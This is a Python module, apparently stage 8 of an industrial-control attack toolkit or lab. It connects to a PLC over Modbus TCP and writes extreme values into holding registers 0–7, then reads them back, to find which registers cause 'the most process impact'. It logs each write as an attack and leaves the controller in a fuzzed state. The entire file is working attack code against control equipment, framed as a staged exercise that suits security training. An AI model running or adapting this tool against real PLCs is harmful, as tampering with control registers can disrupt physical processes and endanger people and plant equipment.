import time
from pymodbus.client import ModbusTcpClient
from scripts.config import get
from utils.colors import ok, err, info, warn, red, green, yellow, cyan, white
from utils import logger

STAGE = {
    'name': 'Register Fuzzer',
    'key':  '8',
    'desc': 'write unexpected values across all registers',
}

BANNER = f"""
{yellow("  ╔══════════════════════════════════════╗")}
{yellow("  ║")} {white("STAGE 8 -- REGISTER FUZZER             ")}{yellow("║")}
{yellow("  ╚══════════════════════════════════════╝")}
"""

FUZZ_VALUES = [0, 1, 255, 256, 1000, 32767, 65535, 65534, 9999, 100, 500]


def run(cfg=None):
    if cfg is None:
        cfg = get()
    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(info("Fuzzer writes unexpected values across holding registers"))
    print(info("to identify which ones cause the most process impact."))
    print()
    print(warn("This will alter PLC register values."))
    confirm = input(yellow("  Type YES to proceed: ")).strip()
    if confirm != 'YES':
        print(info("Aborted."))
        return

    print()
    print(info(f"Connecting to {ip}:{port}..."))
    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print(err("Connection failed."))
        logger.error(f"Fuzzer failed -- could not connect to {ip}:{port}")
        return

    print(ok("Connected."))
    print()
    logger.attack(f"Fuzzer started on {ip}:{port}")

    results = []

    for reg in range(0, 8):
        print(f"  {cyan(f'Register {reg}')}")
        print(f"  {'─'*44}")
        for val in FUZZ_VALUES:
            try:
                client.write_register(address=reg, value=val)
                time.sleep(0.1)
                rr        = client.read_holding_registers(address=reg, count=1)
                read_back = rr.registers[0] if not rr.isError() else 'error'
                accepted  = read_back == val
                status    = green('accepted') if accepted else red(f'returned {read_back}')
                print(f"    write {yellow(str(val)):<8} -> {status}")
                results.append({'reg': reg, 'wrote': val, 'read_back': read_back, 'accepted': accepted})
                logger.attack(f"Fuzz reg={reg} val={val} readback={read_back}")
            except Exception as e:
                print(err(f"    write {val} -> error: {e}"))
        print()

    accepted_count = sum(1 for r in results if r['accepted'])
    print(f"  {cyan('Fuzz Summary')}")
    print(f"  {'─'*44}")
    print(f"  Total writes   : {len(results)}")
    print(f"  Accepted       : {green(str(accepted_count))}")
    print(f"  Rejected/other : {red(str(len(results) - accepted_count))}")
    print()
    print(warn("PLC registers are now in a fuzzed state. Run Reset to restore."))
    print()
    logger.success(f"Fuzzer complete -- {accepted_count}/{len(results)} writes accepted")

    client.close()
